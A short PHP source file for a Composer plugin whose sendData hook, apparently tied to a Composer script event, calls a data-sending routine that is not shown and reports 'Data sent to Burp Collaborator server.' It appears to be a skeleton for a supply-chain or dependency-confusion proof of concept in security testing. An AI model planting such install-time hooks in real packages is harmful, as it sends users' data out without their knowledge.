<?php

namespace MyPackage;

use Composer\Composer;
use Composer\IO\IOInterface;
use Composer\Plugin\PluginInterface;
use Composer\Script\Event;

class MyPackagePlugin implements PluginInterface
{
    public function activate(Composer $composer, IOInterface $io)
    {
    }

    public static function sendData(Event $event)
    {
        $composer = $event->getComposer();
        $io = $event->getIO();

        // Send data
        MyPackage::sendData();

        $io->write('Data sent to Burp Collaborator server.');
    }
}

